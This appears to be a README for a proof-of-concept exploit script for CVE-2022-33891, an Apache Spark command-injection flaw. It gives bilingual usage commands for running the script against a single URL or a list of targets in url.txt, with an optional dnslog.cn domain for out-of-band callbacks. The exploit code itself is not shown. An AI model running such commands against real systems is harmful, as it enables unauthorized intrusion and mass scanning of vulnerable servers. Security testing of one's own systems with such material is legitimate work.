# cve-2022-33891
Usage:
```python
pip3 install requests

# If you do not use the -d parameter, the dnslog domain name will be automatically applied for you.
# 如果你不使用-d参数，则会自动为您申请dnslog域名。

python3 cve_2022_33891_poc.py -u http://127.0.0.1
python3 cve_2022_33891_poc.py -f url.txt

python3 cve_2022_33891_poc.py -u http://127.0.0.1 -d ngpc6c.dnslog.cn
python3 cve_2022_33891_poc.py -f url.txt -d ngpc6c.dnslog.cn

```
Example:  
![](https://s2.loli.net/2022/07/20/LboBqMyTXEpVAkF.png)
